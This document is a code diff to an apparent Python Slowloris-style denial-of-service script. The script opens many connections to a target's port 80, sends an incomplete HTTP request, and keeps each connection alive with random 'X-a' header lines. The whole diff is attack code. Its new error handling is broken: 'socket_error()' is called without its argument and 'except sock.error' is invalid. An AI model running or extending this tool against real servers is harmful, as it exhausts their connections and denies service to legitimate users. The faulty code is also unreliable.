@@ -20,27 +20,27 @@ HEADERS = [
     b"Accept-language: en-US,en,q=0.5",
 ]
 
+def socket_error(sock):
+    """ Handles a socket error: kill the socket. """
+    print("Socket error, killing socket")
+    sock.close()
+    sock = None
+    return sock
+
+
 def init_socket(ip_address):
     """ Inits a socket and sends the first headers. It also sends the start
     of the request.
     """
     sock = socket.create_connection((ip_address, 80), timeout=4)
 
-    for header in HEADERS:
-        try:
-            sock.send(header)
-        except InterruptedError as error:
-            print("Socket error:\n%s\n Killing socket" % error)
-            sock.close()
-            sock = None
-            break
     if sock:
         try:
-            sock.send("GET /?%d /HTTP1.0" % random.randint(1, 5000))
-        except InterruptedError as error:
-            print("Socket error, killing socket")
-            sock.close()
-            sock = None
+            sock.send(b"GET /?%d HTTP/1.1\r\n" %random.randint(0,5000))
+            for header in HEADERS:
+                sock.send(header)
+        except sock.error:
+                sock = socket_error()
     return sock
 
 def send_header(sock):
@@ -48,8 +48,9 @@ def send_header(sock):
     """
     if sock:
         try:
-            sock.send("X-a: %d" %  random.randint(1, 5000))
-        except InterruptedError as error:
+            value = random.randint(1,5000)
+            sock.send(b"X-a: %d\r\n" % value)
+        except socket.error as error:
             print("Socket error:\n%s\n killing socket" % error)
             sock.close()
             LIST_OF_SOCKETS.remove(sock)
